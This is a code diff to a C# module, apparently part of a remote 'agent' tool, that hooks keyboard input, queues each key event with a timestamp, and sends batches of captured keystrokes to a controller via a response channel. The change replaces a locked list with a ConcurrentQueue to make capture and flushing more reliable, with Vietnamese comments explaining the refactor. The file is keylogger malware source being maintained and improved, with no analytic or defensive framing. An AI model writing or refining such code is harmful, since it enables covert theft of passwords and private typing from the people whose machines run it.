@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text.Json;
@@ -18,8 +19,7 @@ namespace AgentSystem.Modules
         private uint hookThreadId = 0;
         private readonly object _stateLock = new object();
 
-        private readonly List<object> keyBuffer = new List<object>();
-        private readonly object bufferLock = new object();
+        private readonly ConcurrentQueue<object> _keyQueue = new ConcurrentQueue<object>();
         
         // Thay Timer cũ bằng CancellationTokenSource + PeriodicTimer
         private CancellationTokenSource flushCts;
@@ -187,24 +187,22 @@ namespace AgentSystem.Modules
                     timestamp_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                 };
 
-                lock (bufferLock)
-                {
-                    keyBuffer.Add(keyEvent);
-                }
+                _keyQueue.Enqueue(keyEvent);
             }
             return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
 
         private void FlushBuffer()
         {
-            List<object> batchToSend;
-
-            lock (bufferLock)
+            var batchToSend = new List<object>();
+            
+            // Rút toàn bộ sự kiện hiện có trong Queue ra một cách an toàn và không lock
+            while (_keyQueue.TryDequeue(out var item))
             {
-                if (keyBuffer.Count == 0) return;
-                batchToSend = new List<object>(keyBuffer);
-                keyBuffer.Clear();
+                batchToSend.Add(item);
             }
+
+            if (batchToSend.Count == 0) return;
 
             context.SendResponse(new
             {
